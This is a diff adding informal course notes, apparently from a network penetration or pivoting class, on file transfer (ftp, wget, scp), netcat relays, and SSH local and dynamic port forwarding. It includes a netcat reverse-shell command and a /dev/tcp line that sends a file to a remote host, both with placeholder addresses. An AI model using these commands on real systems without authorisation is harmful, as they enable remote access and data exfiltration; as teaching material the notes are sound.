@@ -90,3 +90,95 @@ specific ports based on hints/clues
 well knows
 chinks of 2000 or first 10000
 hail mary, (65535)
+-----------------------------------------------------------------
+
+day 5) 
+
+transfering data - tftp, ftp (active/passive), sftp like ftp but with encryption of ssh, ftps, 
+
+ftp <ip> | anonymous(free account on it if enabled) 
+ wget -r <ip> | wget -r ftp://<ip>:<port> 
+
+scp <location> <desination>
+remote | scp student@<ip>: <file path> <where i want it> 
+local | <where its located> student@<ip> :<where you want it> 
+remote to remote | scp -3 student@<ip> :<what you want> student@<ip>:<where you want it>
+
+
+
+port forward | scp -P 1111 student@localhost:file  <where you want it> 
+
+
+netcat 
+--------------
+listning port must be made first 
+
+
+listner
+--------------
+nc <ip> <port> < file.txt
+nc -l -p 9001 > newfile.txt 
+---------------------------
+client relay 
+-----------
+mknod mypipe p (or) mkfifo <name> 
+1
+
+listners 
+-------------
+nc -l -l 9002 < infile (sends info) 
+nc -l -p 9001 > outfile (recieves info) 
+
+send traffic
+-----------------
+nc -l -p 1111 > file.txt
+cat file.txt > /dev/tcp/<ip>/<port>
+
+requesting a shell
+----------------------
+nc -c /bin/sh <your ip> <any unfilterd port> 
+nc -l -p <port that was unfiltered> -vvv
+
+ssh local port forwarding
+-------------------------
+ssh -p <optional alternate port> <user>@<ip> -L <myport>: target:<Target port> -NT 
+
+ex) ssh student@172.16.82.106 -L 1111:localhost:80 -NT
+
+ssh -D <port> -p <alt port> user@povit ip -NT
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
